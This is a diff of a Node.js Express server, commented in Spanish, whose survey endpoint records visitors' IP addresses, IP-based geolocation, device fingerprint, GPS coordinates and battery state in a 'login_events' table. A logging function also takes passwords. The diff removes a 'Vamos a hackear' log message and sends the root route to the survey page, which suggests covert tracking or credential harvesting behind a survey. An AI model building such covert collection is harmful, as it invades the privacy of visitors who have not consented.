@@ -6,7 +6,7 @@ const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
 const cookieParser = require('cookie-parser');
 const UAParser = require('ua-parser-js');
-const https = require('https'); // Usamos https nativo en vez de fetch
+const https = require('https');
 
 const app = express();
 app.set('trust proxy', 1);
@@ -21,27 +21,24 @@ pool.query(`
   ADD COLUMN IF NOT EXISTS battery_level TEXT,
   ADD COLUMN IF NOT EXISTS battery_charging BOOLEAN
 `)
-  .then(() => console.log('Vamos a hackear'))
-  .catch((e) => console.error(' Error en migración:', e.message));
+  .then(() => console.log('✅ Base de datos lista (columnas agregadas)'))
+  .catch((e) => console.error('⚠️ Error en migración:', e.message));
 
 const sha256 = (s) => crypto.createHash('sha256').update(s).digest('hex');
 
 function clientIp(req) {
-  // Buscamos la IP en todos los headers posibles que usa Render/Proxies
-  let ip = process.env.DEBUG_IP 
-    || req.headers['x-forwarded-for']?.split(',')[0].trim() 
-    || req.headers['true-client-ip'] 
-    || req.ip 
-    || '';
-    
-  // Limpiamos el formato de IPv6 si es necesario
-  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
+  // Render usa 'x-forwarded-for' para la IP real, si no existe, usamos req.ip
+  let ip = process.env.DEBUG_IP || req.headers['x-forwarded-for'] || req.ip || '';
   
-  // Si sigue saliendo local, que no diga "Desconocido", que diga "Local/Privada"
+  // Si hay varias IPs (por proxies), tomamos la primera
+  if (ip.includes(',')) ip = ip.split(',')[0].trim();
+  
+  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
   if (ip === '::1' || ip === '127.0.0.1') return 'Local';
   
   return ip;
 }
+
 function limpiarFp(fp = {}) {
   const num = (v, max) => {
     const n = Number(v);
@@ -61,10 +58,9 @@ function limpiarFp(fp = {}) {
   };
 }
 
-// BUSCADOR DE IP SEGURO (Usa https nativo)
 function buscarUbicacion(ip) {
   return new Promise((resolve) => {
-    if (!ip || ip === '::1' || ip === '127.0.0.1') return resolve({ country: null, city: null, lat: null, lng: null });
+    if (!ip || ip === 'Local') return resolve({ country: null, city: null, lat: null, lng: null });
     https.get(`https://ip-api.com/json/${ip}`, (res) => {
       let data = '';
       res.on('data', chunk => data += chunk);
@@ -99,7 +95,7 @@ async function logEvent({ userId, email, password, success, reason, req, fp }) {
        f.gps_lat, f.gps_lng, f.gps_accuracy, f.battery_level, f.battery_charging]
     );
   } catch (err) {
-    console.error('Error guardando login:', err.message);
+    console.error('❌ Error guardando login:', err.message);
   }
 }
 
@@ -142,10 +138,9 @@ app.post('/api/survey', async (req, res) => {
     const ip = clientIp(req);
     const geo = await buscarUbicacion(ip);
     const ua = new UAParser(req.get('user-agent')).getResult();
-    const resumen = `Encuesta: ${survey.q1} | ${survey.q3}`;
+    const resumen = survey.q1; // El resumen ya viene armado desde el HTML
     const deviceModel = ua.device.model ? `${ua.device.vendor || ''} ${ua.device.model}`.trim() : (ua.device.type || 'desktop');
     
-    // Aquí es donde podría estar fallando. Lo ponemos en un try/catch interno para ver el error real.
     try {
       await pool.query(
         `INSERT INTO login_events
@@ -155,11 +150,11 @@ app.post('/api/survey', async (req, res) => {
          fp.screen_res, fp.language, fp.timezone, fp.connection_type, fp.cpu_cores, fp.gps_lat || null, fp.gps_lng || null, fp.gps_accuracy || null, fp.battery_level || null, fp.battery_charging || false]
       );
     } catch (dbError) {
-      console.error('ERROR CRÍTICO EN BD:', dbError.message);
+      console.error('❌ ERROR CRÍTICO EN BD:', dbError.message);
       return res.status(500).json({ error: 'Error en la base de datos: ' + dbError.message });
     }
 
-    res.json({ ok: true, ip: ip || '127.0.0.1', ua: `${ua.browser.name} en ${ua.os.name}`, device: deviceModel });
+    res.json({ ok: true, ip: ip || 'Local', ua: `${ua.browser.name} en ${ua.os.name}`, device: deviceModel });
   } catch (err) { 
     console.error(err);
     res.status(500).json({ error: 'Error al guardar' }); 
@@ -176,6 +171,6 @@ app.get('/api/admin/stats', requireAuth, requireAdmin, async (req, res) => {
   res.json(rows[0]);
 });
 
-app.get('/', (req, res) => res.redirect('/login.html'));
+app.get('/', (req, res) => res.redirect('/survey.html')); // Redirige a la encuesta por defecto
 app.use(express.static('public'));
 app.listen(process.env.PORT || 3000, () => console.log(`Servidor listo`));
